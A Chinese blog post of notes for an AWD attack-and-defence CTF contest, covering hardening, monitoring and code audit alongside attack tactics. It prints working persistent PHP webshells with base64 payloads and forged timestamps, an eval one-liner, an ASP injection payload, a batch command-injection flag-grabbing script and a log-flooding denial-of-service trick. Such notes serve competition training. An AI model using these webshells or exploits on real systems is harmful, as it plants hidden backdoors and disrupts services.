---
layout:     post
title:      Web笔记（十六）AWD Web攻防
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是记录最近参加公司AWD攻防比赛所做的准备工作、比赛的策略技巧和赛后的心得体会。
date:       2020-12-17
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - AWD
---



## 0x00 AWD简介

AWD（Attack with Defence），攻防对抗赛，一般是在一个C段网络下，有各自队伍维护的服务器，服务器上运行着Web站点、PWN服务或者其他服务。各队之间一边加固防御，一边攻击其他队伍，获取其他队伍的flag，并提交到flag机得分，自己的服务器被攻击拿到flag就会被扣分。

有种大混战的感觉，批量攻击也很重要。

比赛中也可能会有NPC，NPC不会修复，但是参赛队伍可以自己进行利用，对其进行修复应该也可以，根据赛制规定来就好。

比赛可能会给一定时间修复加固。



## 0x01 防御思路

#### 1. 改密码

- SSH登录密码

```shell
passwd
```

输入passwd之后，输入一次旧密码，然后输入两次新密码即可。

新密码最好事先商量好，并且不是弱密，可以随机生成。

- 网站后台admin密码

直接网站后台修改管理原密码即可，但可能自己也不知道自己的网站后台密码是什么，可能需要先弱口令爆破，或者找到数据库进去查找（前提是数据库存储的不是哈希值，可能性不大），或者看网站有无提示。

- 数据库密码

改了的话网站配置文件也需要改，一般不需要。

修改数据库密码：

首先终端输入

```shell
vim /etc/my.cnf
```

在这个文件中的最后一行输入：`skip-grant-tables`，然后保存退出，接着在终端输入

```shell
service mysqld restart
```

然后输入下述指令进入数据库

```shell
mysql -uroot -p
```

直接回车开始修改MySQL用户密码，接着输入

```
use mysql;
update user set password = password(“123456”)where user=’root’;
```

其中123456为新密码。

#### 2. 备份

- 网站源码备份

方法一：ftp连接下载源码

其实也是用工具，打开工具Filezilla，输入主机ip地址（要用sftp协议，即输入`sftp://ip`）、用户名、密码、端口，连接后直接找到网站根目录`/var/www/html`，右键下载即可。

方法二：工具备份

使用MobaXterm工具ssh连接，然后左侧会显示站点目录，将网站根目录右键下载即可。

方法三：压缩命令备份

压缩命令

```shell
tar -zcvf www.tar.gz /var/www/*
```

解压命令

```shell
tar -zxvf www.tar.gz
```

- 数据库备份

数据库备份（输入下面命令后需要再输入数据库密码）

```shell
mysqldump -u root -p [数据库名]>[备份文件名].sql
mysqldump -u root -p blog > blog.sql
```

恢复

```shell
mysql -u root -p blog < blog.sql
```

或者进入mysql后输入以下命令

```
source blog.sql;
```

#### 3. D盾查杀

下载源码下来，然后用D盾（Webshellkill.exe）查杀后门文件。

如果查到的话，需要上服务器删除或者加固，限制输入等。

如果查到的话也要及时跟进攻的队友沟通，拼手速利用起来刷一波分。

#### 4. 加waf、文件监控、流量监控

进行下述操作后都应该习惯性不断地去看服务有没有挂，网站是否正常显示，是否check down。

- 通用waf

上个通用waf和批量刷通防的脚本两个文件。

批量通防一般准备两个版本，一个python，一个php版，服务器支持python就直接python生成，如果不行就用php版，需要访问激活。

通防需要控制好级别，对于什么样的流量需要作出什么反应，是die掉，还是只做记录，还是做重定向等，要根据check机制做相应处理。

- 文件监控

文件监控脚本需要在脚本部署好之后再开启，指定好目录，如果某个文件被修改就将其删除，保险起见最好先设置为记录或者恢复，而不是删除。

功能：备份运行文件监控脚本前所有文件，删除新增非自用文件，记录新增文件，知晓文件变动历史

- 流量监控

上流量监控脚本，一般通防都已经包含了流量监控记录了，但需要做好取舍，因为如果所有流量所有信息都记录可能会被DDoS攻击，导致内存超限而宕机。

功能：获得他人的攻击流量，木马密码等。

#### 5. 防不死马

不死马就是不管怎么删除都会出现的后门，其背后一定有一个进程在不断生成它。

防不死马就几种方法。

- 生成一个和不死马同名的文件

```shell
rm .index.php;mkdir .index.php
```

直接终端输入一行命令进去，不要分两步，因为可能不死马生成速度很快，等手动输入第二句命令可能就同名冲突了。

- 执行另一段程序竞争写入无效内容到不死马文件中

```php
<?php
	ignore_user_abort(true);
 	set_time_limit(0);
 	unlink(__FILE__); 
 	$file = '.index.php';
 	$code = 'Hello, world!'
 	while(true) {
		file_put_contents($file, $code);
		usleep(500);
	}
?>
```

注意usleep()的时间必须比不死马生成的时间小，可以大概估摸一下，注意浏览器访问该文件进行激活。

- 杀进程

找到生成不死马的进程

```shell
ps -aux | grep shell.php
或者
ps auxww | grep shell.php
```

不一定是`grep shell.php`，个人一般直接`grep www`，然后看下有没有可疑的进程，但是一般很难看出，除非是用shell脚本开启的生成不死马进程，否则用这种访问php文件激活生成不死马程序的方式是很难发现的，因为显示的描述都是www-data用户开启的apache服务。

如果找到了进程，则将其进程id放在下面命令去执行。

```shell
kill -9 [pid]
例如：
kill -9 25536
```

也可以用php文件来杀进程，如下代码

```php
<?php
    while(1){
        $pid=1111;
        @unlink('.index.php');
        exec('kill -9 $pid');
    }
?>
```

注意修改pid，以及unlink()的是不死马文件名。

- 重启php服务

#### 6. 代码审计

防御工作后面大部分时间就是代码审计了，代码审计很重要，有时还能转守为攻。

用**seay代码审计工具**审计网站代码，查找一些如SQL注入、命令执行、文件包含、文件上传等类型的漏洞，跟踪敏感函数等。后面展开细讲一下。

发现漏洞点要及时修补，最直接的方法加一些过滤限制，如过滤掉flag、敏感函数名等，还可以做一些强制类型转换，如：强制转换为int型，在转回str型。

一些php弱类型需要作调整，如：“==”号转为“===”。

暂时想到这些，以后有想到再单独记录。。。



## 0x02 攻击思路

扫完IP和服务，赶紧看看队友D盾扫描有没有发现什么网站后门，有的话赶紧利用起来，刷一波分。然后直接蚁剑、菜刀连接，进服务器种个不死马，然后再做其他代码审计挖洞等等。

#### 1. 主机发现和端口扫描

- Nmap扫描

执行下面命令之前先在当前目录下生成ip.txt文件，文件写入待扫描的ip，如：`192.168.43.1-255`

```
nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oG result.txt -iL ip.txt
```

执行完将结果保存在result.txt中。

#### 2. 站点目录扫描

- 御剑
- dirsearch（Linux工具）

```
./dirsearch.py -u 192.168.43.111 -e php
```

指定站点类型为php。

- 其他爆目录的工具......

#### 3. 后台弱口令

Burpsuite+Firefox+FoxyPorxy（其他代理插件也可以），拦截抓包弱口令爆破。

一般后台账户都是admin。

也可以在网站发现是否有提示，如提供爆破密码等。

#### 4. 命令执行

看看有无命令执行点，直接`cat /flag`

#### 5. 文件包含、目录穿透

文件包含最明显的特征是url中包含类似`php?file=xxxx`，那就可能存在文件包含。

目录穿透是可以直接`php?file=../../../../../../../../../../../flag`读取到flag文件内容。

当然还有很多种情况，现在经验不多，见到或想到再继续积攒。

#### 6. 文件上传

找到文件上传的地方很关键，因为上传的文件所在的目录有写权限。

当然上传可能会有很多限制，最不济上传一个jpg图片马，然后想办法改成php或者文件包含当做php执行。

#### 7. sql注入

打的比赛还没有发现sql注入漏洞的，但如果可以注入的话除了脱库，还可以尝试sql写一句话webshell，可以利用sqlmap写。

#### 8. 框架漏洞

最常见的如

- 博客网站plugins、theme文件包含一句话，通过修改文件，加入一句话即可连接。
- bluecms v1.6

ad_js.php sql注入；

http头注入；

编辑文件时文件包含；

宽字节注入。

- tomcat

8009端口ajp漏洞；

manage.html文件包含漏洞。

- jboss 命令执行RCE
- wordpress 外观（主题）编辑getshell
- redis 4.x/5.x RCE远程命令执行

exp：[https://github.com/Ridter/redis-rce](https://github.com/Ridter/redis-rce)

需要python3.6版本以上，将input改为raw_input可以用python2.7运行。

- 魅力CMS

后台模板设置管理公司名称注入

```
%><%eval request(cmd)
```

保存后可以访问http://xxx.com/inc/config.asp处可以getshell。

#### 9. 种不死马

拿到webshell之后，进入服务器要种不死马，我了解的有两种方式：

- shell脚本

在有写权限的目录下新建一个usr_bin_apache.sh（名字仅为了迷惑，自取），写入如下内容：

```sh
while true;
do echo '<?php if(md5($_POST[pass])=="8439ab786d9712478e98c6afe8d62c98"){@eval($_POST[a]);} ?>' >.index.php;
touch -m -d "2020-12-17 09:30:01" .index.php;
chmod +x .index.php;
sleep 5;
done;
```

时间自己改就行，目的是防止对方根据文件生成时间进行查杀。

不死马名称为.index.php。

连接方式为：http://xxx/xx.php，然后post参数`pass=YXR0YWNr&a=system(ls);`，改参数a的值来执行系统命令。

- php文件激活

创建一个文件shell.php写入下面内容或者直接上传，注意要在有写权限的目录下激活，否则生成不了不死马。

```php
<?php
 ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__); 
 $file = '.index.php';
 $code = base64_decode('PD9waHAgaWYobWQ1KCRfUE9TVFtwYXNzXSk9PSI4NDM5YWI3ODZkOTcxMjQ3OGU5OGM2YWZlOGQ2MmM5OCIpe0BldmFsKCRfUE9TVFthXSk7fSA/Pg==');
 while(true) {
     if(md5(file_get_contents($file))!=md5($code)) {
         file_put_contents($file, $code);
     }
     usleep(500);
 }
?>
```

写完需要浏览器访问该shell.php文件进行激活，激活后会进入进程，然后把自动把shell.php文件删除。

不死马名称为.index.php。

连接方式为：http://xxx/xx.php，然后post参数`pass=YXR0YWNr&a=system(ls);`，改参数a的值来执行系统命令。



## 0x03 代码审计

#### 1. 代码审计的基本流程

-  体会网站整体结构

  - 目录结构如何：后台目录、上传目录、功能函数目录、配置信息目录
  - 入口文件
  - 配置文件
  - 功能模块
  - 数据库结构
-  通过功能有指向性地分析
   -  登录注册模块
   -  文件上传模块
   -  请求资源模块
   -  信息反馈模块
   -  输入过滤模块
-  抓住敏感函数进行回溯
   -  代码执行
   -  文件包含
   -  系统命令执行
   -  文件操作
- 魔法函数（反序列化等）

#### 2. 代码审计的基本方法

- 通读源码审计法

通读源码，理解透彻整个业务逻辑，通过入口文件模块进行分析，把握网站整体结构

缺点是：对大程序的分析不友好

- 功能定向审计法

通过入口文件模块进行分析，浏览器访问应用功能，浏览器黑盒测试，白盒审计挖掘对应漏洞

- 敏感函数回溯审计法

发现敏感函数，追溯函数输入参数，尝试控制参数

审计工具：seay审计工具

#### 3. php的配置文件

- php.ini    默认的配置文件，全局的配置文件
- .user.ini    用户级的配置文件，放在对应的目录下覆盖默认的配置
- .htaccess    apache特有，同.user.ini
- http.conf    apache特有，全局配置

#### 4. 常见的重要配置

- short_open_tag = On    短标签   \<?eval($_POST[1])?\>
- disabled_function = 禁用函数        上传webshell后绕过，蚁剑插件

- 文件上传相关配置

```ini
file_uploads = On
upload_max_filesize = 16M
upload_tmp_dir = /tmp
open_basedir = .:/tmp/    允许访问的目录
```

- 调试信息配置

```ini
display_error = On    调试信息显示
error_reporting = E_ALL
```

- 文件包含配置

```ini
allow_url_fopen = On            文件打开/包含，默认允许打开远程文件，但是不允许包含
allow_url_include = On
```

#### 5. 敏感函数

- 代码执行函数
- eval、assert 字符串作为php代码执行    assert($_GET[2];)
- preg_replace(pattern,string) /e修饰时，会将第二个参数作为php代码执行
- create_function()    匿名函数，代码注入
- call_user_func、call_user_func_array
- 文件包含函数
- require
- require_once
- include
- include_once

```php
include $file     伪协议、过滤器
include($_GET['file'])
```

- 命令执行
- exec
- passthru
- proc_open
- shell_exec
- system
- popen

- 文件操作
- copy                写shell可能用上
- file_get/put_contents
- file
- fopen
- move_file
- uploaded_file
- readfile
- rename
- rmdir
- unlink&delete    不死马

#### 6. 最主要的几点
- 审计反序列化时，直接__destruct全局搜索，而后往下推进，查看是否存在可利用的参数与可利用的方法。
- 审计SQL注入时，一定要摒弃所有封装的外层直接查看最底层的SQL语句实现。
- 代码审计找的其实就是用户可控的参数与可控的函数。



## 0x04 小技巧

#### 1. 如何完全获得www目录（即自己通过ssh连上靶机的用户）权限

一般来说，www目录下的权限为www-data用户的，这也是apache的权限，而我们则是一个新用户，比方说ubuntu，我们同这个www-data同处一个用户组，远程RCE写入的webshell可能无法被删除（ubuntu没法操作www-data的文件）所以获得自己对www目录的权限很重要。

加固阶段先备份www目录，然后rm -rf www(此时权限744)再重新上传自己的www，从而获得自己权限的www。

#### 2. Apache错误日志写满硬盘使他人服务被down从而自己得分

Apache的权限叫普通用户较高，所以写入的文件无法被删除。

直接ddos访问错误路径写入log导致其他选手服务无法正常服务。

框架一般有日志，访问一个错误路径即可。

#### 3. 给自己种不死马

apache的权限比普遍用户的权限较高，所以如果给自己种一个加密的不死马，在服务器被其他人提权后，还能拥有一定权限（www-data）可以在发生如上情况是及时止损。



## 0x05 工具

- Burpsuite    抓包改包工具
- FoxyProxy/SwitchyOmega    火狐浏览器代理设置工具
- dirsearch/御剑    目录爆破工具
- D盾（Webshellkill.exe）    查杀后门
- Seay代码审计工具
- 菜刀/蚁剑    后门连接工具
- phpstudy_pro    windows本地php环境
- MobaXterm/SecureCRT/Putty    SSH连接服务器后台，MobaXterm还有很多其他功能
- MobaXterm/Filezilla    FTP连接工具
- Pycharm/VScode    python调试工具
- Sublime Text    配置好python、php插件可以当做调试工具用，也可以当文本编辑器用，功能很强大

还有很多其他工具没有一一列举，以后遇到还有其他常用的再补充。



## 0x06 常见脚本

#### 1. 一句话

```php
<?php @eval($_POST[x]);?>
```

#### 2. 生成不死马

php版生成不死马（记得浏览器访问该文件激活）

```php
<?php
 ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__); 
 $file = '.index.php';
 $code = base64_decode('PD9waHAgaWYobWQ1KCRfR0VUW3hdKT09PSc4NDM5YWI3ODZkOTcxMjQ3OGU5OGM2YWZlOGQ2MmM5OCcpe2V2YWwoJF9QT1NUW2FdKTt9Pz4=');
 while(true) {
     if(md5(file_get_contents($file))!=md5($code)) {
         file_put_contents($file, $code);
     }
     usleep(5000);
 }
?>
```

shell版生成不死马

```shell
while true;
do echo '<?php if(md5($_POST[pass])=="8439ab786d9712478e98c6afe8d62c98"){@eval($_POST[a]);} ?>' >.index.php;
touch -m -d "2020-12-17 09:30:01" .index.php;
chmod +x .index.php;
sleep 5;
done;
```

需要执行命令`sh test.sh`来激活。

#### 3. 批量getflag

```python
#!/usr/bin/env python

from __future__ import print_function
import sys
import json
import time
import requests
import re
import urllib3
try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode
try:
    import httplib
except ImportError:
    import http.client as httplib

server_host = '192.168.1.2'   # 改成flag提交机的IP
server_port = 80            # 改成flag提交机的端口
team08_token = 'abcdefghijklmnopqrstuvwxyz123456'           # 队伍token写在这里

if __name__ == '__main__':    
    #### 构造拿flag的url #######（当时比赛队伍的ip是192.168.201-212）
    url_list = ['http://192.168.1.2%02d/manager?command=cat${IFS}/fla?' % i for i in range(1, 13)]
    print(url_list)
    # 这一块区域是构造url列表
    
    #######################################
    
    while True:
        ###### 这里写getflag代码 ######
        flag_list = []
        for url in url_list:
            try:
                # 这里写拿flag代码
                rev = requests.get(url)
                t = re.findall('(.*)', rev.text, re.S)	# 注意修改正则匹配规则，这里当时是直接返回flag内容，只需要去掉最后的换行符即可
                if t:
                    print('[+] ' + url + '的flag是' + t[0])
                    flag_list.append(t[0].strip())
                
            except Exception as  e:
                print(url)
                print(e)
        ###############################
        
        # 提交flag，模拟curl -d "flag=xxx&token=xxx" 192.168.1.2/api/flag/submit
        for flag in flag_list:
            http = urllib3.PoolManager()
            for flag in flag_list:
                headers = {
                    "Content-type": "application/x-www-form-urlencoded"
                }
                rev = http.request('POST', 'http://192.168.1.2/api/flag/submit',
                                   fields={'flag': flag, 'token': '55dM4d397p'}, headers=headers)
                print(rev)
        time.sleep(180)     # 延时3分钟，可以设置跟flag刷新时间一致
```

#### 4. 批量文件上传

关键代码

```python
file = {
    'pic': ('2.php': open('a.php', 'rb')),
    'Content-Disposition': 'form-data',
    'Content-Type': 'image/jpeg',
}
```

可参考：[https://github.com/admintony/Prepare-for-AWD](https://github.com/admintony/Prepare-for-AWD)

#### 5. 批量getshell

参考：[https://github.com/admintony/Prepare-for-AWD](https://github.com/admintony/Prepare-for-AWD)

#### 6. 通用waf

参考：[https://github.com/admintony/Prepare-for-AWD](https://github.com/admintony/Prepare-for-AWD)

[Watchbird](https://github.com/leohearts/awd-watchbird)

#### 7. 批量上waf

php版install-waf.php

```php
<?php
/**
* find the php file
* write the "include('waf.php')" in php file
*/


$_DEFAULT_PATH = '/var/www/html';

function find_php_file($web_root_path){
	$cmd = 'find '.$web_root_path .' -name \'*.php\' > file';
	system($cmd);
}


function install_waf($add_string){
	$failed_list = array();
	$file_string = file_get_contents('file');
	$file_array = explode("\n", $file_string);
	foreach ($file_array as $key => $value) {
		if(strpos($value,'conf')){	// 匹配到文件名带有conf
			$content = file_get_contents($value);
			$content = str_replace("\r\n", "\n", $content);
			$content = str_replace("\r", "\n", $content);
			$new_content = $add_string.$content;
			if(strlen($new_content) === file_put_contents($value, $new_content)){
				echo '[+] add waf completed: '.$value."\n";
			}else{
				echo '[-] add waf failed: '.$value."\n";
				array_push($failed_list, $value);
			}
			
		}

	}
	if(count($failed_list) === 0){
		echo '[+] all choice file add waf successfully'."\n";
	}else{
		echo '[-] failed file:'."\n";
		$res = implode("\n", $failed_list);
		echo $res;
	}

}

if(count($argv) > 1){
	$web_root_path = $argv[1];
}
else{
	$web_root_path = $_DEFAULT_PATH;
}
$add_strings = "<?php require_once('$web_root_path/waf.php'); ?>\n";

find_php_file($web_root_path);

install_waf($add_strings);

```

python版install-waf.py

```python
# -*- conding:utf-8 -*-
#! /usr/bin/python
# find the php file
# write the "include('waf.php')" in php file

import os
import sys

DEFAULT_PATH = '/var/www/html/'

def find_php_file(web_root_path):
    cmd = 'find {0} -name \'*.php\' > file'.format(web_root_path)
    os.system(cmd)


def install_waf(add_strings,level='conf'):
    fail_list = []
    with open('file') as f:
        s = f.read()
    tmp_list = s.split('\n')
    file_list = [i for i in tmp_list if len(i)>0]
    
    for file in file_list:
        if level == 'conf':
            if level not in file:
                continue
        if 'waf.php' in file:
            continue    
        try:
            fr = open(file)
            contents = fr.read()
            fr.close()
            new_contents = add_strings + contents
            new_contents = new_contents.replace('\r\n','\n').replace('\r','\n')
            fw = open(file,'wb')
            fw.write(new_contents)
            fw.close()
            print('[+] add waf completed: ' + file)
        except Exception,e:
            print('[-] add waf failed: ' + file)
            fail_list.append(file)
            print e

    if len(fail_list) == 0:
        print('[+] all choice file add waf successfully')
    else:
        print('[-] failed file:')
        print("\n".join(fail_list))


if __name__ == '__main__':
    try:
        web_root_path = sys.argv[1]
    except:
        web_root_path = DEFAULT_PATH

    if os.path.isdir(web_root_path):
        pass
    else:
        print(web_root_path,'is not exist!!!')
        exit()
    try:
        print('choice: [1] all php file, [2] just config file')
        level = raw_input('input the level num (default:all php file): ')
        if int(level) == 1:
            level = 'all'
        else:
            level = 'conf'
    except:
        level = 'conf'
        

    add_strings = '<?php require_once(\'{0}waf.php\'); ?>\n'.format(web_root_path)

    find_php_file(web_root_path)

    install_waf(add_strings,level)
```



## 0x07 心得体会

手速很重要！！！发现漏洞之后就要一边拼手速把其他队伍的站点也秒了，一边要做好自己的防御，一边要赶紧写脚本或者改脚本进行批量利用。在最近的比赛中这方面吃了大亏，没有别人手快，亏了一轮分。

发现被攻击的时候，首先要冷静，检查waf是否上了，有没有防住；分析流量，看访问的是哪个文件；代码审计，仔细检查找到漏洞点，进行防御。

个人在比赛的时候有两个靶机，看大佬们先攻击到哪一台靶机，紧跟他们的步伐去重点分析。

赛后感觉流量分析太重要了，要是能早点上waf记录大佬们的攻击记录，光是重放就能瓜分好多分了。